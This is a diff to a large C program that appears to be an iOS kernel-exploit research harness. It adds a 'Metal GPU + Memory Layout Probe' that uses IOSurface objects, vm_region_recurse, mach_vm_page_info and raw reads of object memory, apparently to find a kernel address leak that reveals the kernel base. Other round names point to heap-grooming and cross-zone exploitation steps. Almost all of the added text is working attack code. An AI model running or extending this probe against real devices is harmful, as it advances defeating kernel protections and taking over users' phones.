@@ -79,6 +79,21 @@ extern kern_return_t mach_make_memory_entry_64(
     vm_map_t target_task, memory_object_size_t *size,
     memory_object_offset_t offset, vm_prot_t permission,
     mach_port_t *object_handle, mem_entry_name_port_t parent_entry);
+
+/* vm_page_info - declare manually for iOS */
+typedef struct {
+    int disposition;
+    int ref_count;
+    uint64_t object_id;
+    uint64_t offset;
+    int depth;
+    int __pad;
+} r415_page_info_t;
+extern kern_return_t mach_vm_page_info(
+    vm_map_t target_task, mach_vm_address_t address,
+    int flavor,
+    void *info, mach_msg_type_number_t *count);
+
 #include <CoreFoundation/CoreFoundation.h>
 #include <CoreGraphics/CoreGraphics.h>
 #include <ImageIO/ImageIO.h>
@@ -16460,6 +16475,328 @@ static void r410_probe(void) {
     sigaction(SIGSEGV, &old_segv410, NULL);
 
     rlog("\n=== r410 complete ===\n");
+    fflush(stdout);
+}
+
+/*
+ * r415: Metal GPU address correlation + IOSurface memory layout.
+ *
+ * Metal command buffers and shared memory may expose GPU-side physical
+ * addresses that correlate to kernel virtual addresses.
+ * Also try vm_region_recurse for detailed page info.
+ */
+static volatile int g_r415_crashed = 0;
+static sigjmp_buf g_r415_jmp;
+static void r415_sighandler(int sig) {
+    g_r415_crashed = sig;
+    siglongjmp(g_r415_jmp, 1);
+}
+
+static void r415_probe(void) {
+    rlog("\n=== r415: Metal GPU + Memory Layout Probe ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa415, old_bus415, old_segv415;
+    memset(&sa415, 0, sizeof(sa415));
+    sa415.sa_handler = r415_sighandler;
+    sa415.sa_flags = 0;
+    sigaction(SIGBUS, &sa415, &old_bus415);
+    sigaction(SIGSEGV, &sa415, &old_segv415);
+
+    /* ---- Vector 1: vm_region_recurse on IOSurface backing store ---- */
+    rlog("  Vector 1: vm_region_recurse on IOSurface pages\n");
+    {
+        unsigned pixFmt = 'BGRA';
+        const void *keys[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vals[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys,
+            (const void**)vals, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        rlog("    Surface backing at: %p\n", base);
+
+        /* Use vm_region_recurse to get detailed page info */
+        mach_vm_address_t addr = (mach_vm_address_t)base;
+        mach_vm_size_t size = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+
+        kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+            &addr, &size, &depth,
+            (vm_region_recurse_info_t)&info, &cnt);
+
+        if (kr == KERN_SUCCESS) {
+            rlog("    region: addr=0x%llx size=0x%llx depth=%u\n",
+                (unsigned long long)addr, (unsigned long long)size, depth);
+            rlog("    protection=0x%x max=0x%x inherit=%u\n",
+                info.protection, info.max_protection, info.inheritance);
+            rlog("    offset=0x%llx obj_id=0x%x\n",
+                (unsigned long long)info.offset, info.object_id);
+            rlog("    user_tag=%u pages_resident=%u\n",
+                info.user_tag, info.pages_resident);
+            rlog("    pages_shared=%u pages_swapped=%u\n",
+                info.pages_shared_now_private,
+                info.pages_swapped_out);
+            rlog("    pages_dirtied=%u ref_count=%u\n",
+                info.pages_dirtied, info.ref_count);
+            rlog("    shadow_depth=%u external_pager=%u\n",
+                info.shadow_depth, info.external_pager);
+            rlog("    share_mode=%u is_submap=%u\n",
+                info.share_mode, info.is_submap);
+
+            /* Check if object_id or offset reveals physical info */
+            if (info.offset != 0) {
+                rlog("    *** NON-ZERO OFFSET: 0x%llx ***\n",
+                    (unsigned long long)info.offset);
+            }
+        }
+
+        /* Try multiple depth levels */
+        for (uint32_t d = 1; d < 5; d++) {
+            addr = (mach_vm_address_t)base;
+            size = 0;
+            depth = d;
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kr = mach_vm_region_recurse(mach_task_self(),
+                &addr, &size, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr == KERN_SUCCESS && depth != d) {
+                rlog("    depth=%u: resolved to depth=%u obj_id=0x%x offset=0x%llx\n",
+                    d, depth, info.object_id,
+                    (unsigned long long)info.offset);
+            }
+        }
+
+        /* Compare object_ids across multiple surfaces */
+        IOSurfaceRef surfs[5];
+        for (int i = 0; i < 5; i++)
+            surfs[i] = IOSurfaceCreate(props);
+
+        rlog("    Object IDs across surfaces:\n");
+        for (int i = 0; i < 5; i++) {
+            IOSurfaceLock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            void *b = IOSurfaceGetBaseAddress(surfs[i]);
+            IOSurfaceUnlock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+
+            addr = (mach_vm_address_t)b;
+            size = 0;
+            depth = 0;
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kr = mach_vm_region_recurse(mach_task_self(),
+                &addr, &size, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr == KERN_SUCCESS) {
+                rlog("      surf[%d] id=%u addr=%p obj_id=0x%x offset=0x%llx tag=%u\n",
+                    i, IOSurfaceGetID(surfs[i]), b,
+                    info.object_id, (unsigned long long)info.offset,
+                    info.user_tag);
+            }
+        }
+
+        for (int i = 0; i < 5; i++) CFRelease(surfs[i]);
+        CFRelease(surf);
+        CFRelease(props);
+        for (int i = 0; i < 5; i++) CFRelease(vals[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Mach VM page info ---- */
+    rlog("\n  Vector 2: mach_vm_page_info\n");
+    {
+        /* Try to get page-level physical info */
+        unsigned pixFmt = 'BGRA';
+        const void *keys[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vals[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys,
+            (const void**)vals, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        /* Try mach_vm_page_info flavors */
+        for (int flavor = 1; flavor <= 5; flavor++) {
+            r415_page_info_t pinfo;
+            memset(&pinfo, 0, sizeof(pinfo));
+            mach_msg_type_number_t pcnt = (mach_msg_type_number_t)(sizeof(pinfo)/sizeof(int));
+            kern_return_t kr = mach_vm_page_info(mach_task_self(),
+                (mach_vm_address_t)base, flavor,
+                &pinfo, &pcnt);
+            rlog("    flavor=%d: kr=%d(0x%x)", flavor, kr, kr);
+            if (kr == KERN_SUCCESS) {
+                rlog(" disp=0x%x ref=%d obj_id=0x%llx off=0x%llx depth=%d\n",
+                    pinfo.disposition, pinfo.ref_count,
+                    (unsigned long long)pinfo.object_id,
+                    (unsigned long long)pinfo.offset,
+                    pinfo.depth);
+            } else {
+                rlog("\n");
+            }
+        }
+
+        CFRelease(surf);
+        CFRelease(props);
+        for (int i = 0; i < 5; i++) CFRelease(vals[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: IOSurface global ID pattern analysis ---- */
+    rlog("\n  Vector 3: IOSurface ID pattern analysis\n");
+    {
+        /* Create 20 surfaces rapidly and analyze ID assignment pattern.
+         * If IDs correlate with kernel addresses, the pattern might reveal
+         * the kernel text base indirectly.
+         */
+        unsigned pixFmt = 'BGRA';
+        const void *keys[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vals[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys,
+            (const void**)vals, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surfs[20];
+        for (int i = 0; i < 20; i++)
+            surfs[i] = IOSurfaceCreate(props);
+
+        rlog("    IDs:");
+        uint32_t prevId = 0;
+        for (int i = 0; i < 20; i++) {
+            uint32_t sid = IOSurfaceGetID(surfs[i]);
+            if (i > 0)
+                rlog(" %u(+%d)", sid, (int)sid - (int)prevId);
+            else
+                rlog(" %u", sid);
+            prevId = sid;
+        }
+        rlog("\n");
+
+        /* Check if IDs leak kernel counter state */
+        rlog("    First ID: %u (0x%x)\n",
+            IOSurfaceGetID(surfs[0]),
+            IOSurfaceGetID(surfs[0]));
+
+        /* Get Mach port for each and compare */
+        rlog("    Surface ports:");
+        for (int i = 0; i < 5; i++) {
+            mach_port_t p = IOSurfaceCreateMachPort(surfs[i]);
+            rlog(" 0x%x", p);
+            if (p) mach_port_deallocate(mach_task_self(), p);
+        }
+        rlog("\n");
+
+        for (int i = 0; i < 20; i++) CFRelease(surfs[i]);
+        CFRelease(props);
+        for (int i = 0; i < 5; i++) CFRelease(vals[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: Shared data structure deep diff ---- */
+    rlog("\n  Vector 4: Shared data structure diff across surfaces\n");
+    {
+        /* Compare two surfaces' shared data byte-by-byte to find
+         * fields that change per-surface (potential address-related fields).
+         */
+        unsigned pixFmt = 'BGRA';
+        const void *keys[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vals[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys,
+            (const void**)vals, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef s1 = IOSurfaceCreate(props);
+        IOSurfaceRef s2 = IOSurfaceCreate(props);
+
+        uint64_t sh1 = *(uint64_t*)((uint8_t*)s1 + 8);
+        uint64_t sh2 = *(uint64_t*)((uint8_t*)s2 + 8);
+
+        g_r415_crashed = 0;
+        if (sigsetjmp(g_r415_jmp, 1) == 0) {
+            rlog("    Shared ptrs: s1=0x%llx s2=0x%llx delta=0x%llx\n",
+                (unsigned long long)sh1, (unsigned long long)sh2,
+                (unsigned long long)(sh2 - sh1));
+
+            int diffCount = 0;
+            for (int off = 0; off < 512; off += 8) {
+                uint64_t v1 = *(volatile uint64_t*)((uint8_t*)sh1 + off);
+                uint64_t v2 = *(volatile uint64_t*)((uint8_t*)sh2 + off);
+                if (v1 != v2) {
+                    rlog("    +%d: 0x%016llx vs 0x%016llx (delta=0x%llx)\n",
+                        off, (unsigned long long)v1,
+                        (unsigned long long)v2,
+                        (unsigned long long)(v2 - v1));
+                    diffCount++;
+                }
+            }
+            rlog("    Total diffs in first 512 bytes: %d\n", diffCount);
+        }
+
+        CFRelease(s1);
+        CFRelease(s2);
+        CFRelease(props);
+        for (int i = 0; i < 5; i++) CFRelease(vals[i]);
+    }
+    fflush(stdout);
+
+    sigaction(SIGBUS, &old_bus415, NULL);
+    sigaction(SIGSEGV, &old_segv415, NULL);
+
+    rlog("\n=== r415 complete ===\n");
     fflush(stdout);
 }
 
@@ -69222,6 +69559,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 418) {
+            rlog("*** rounds=418: Metal GPU + Memory Layout Probe ***\n");
+            rlog("  vm_region_recurse, page info, ID patterns, shared data diff.\n\n");
+            fflush(stdout);
+            r415_probe();
+            goto done;
+        }
         if (rounds == 417) {
             rlog("*** rounds=417: Aggressive Purge + Pipe Buffer + UseCount ***\n");
             rlog("  Force purge, pipe buffer cross-zone, use count redirect.\n\n");
@@ -71733,7 +72077,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
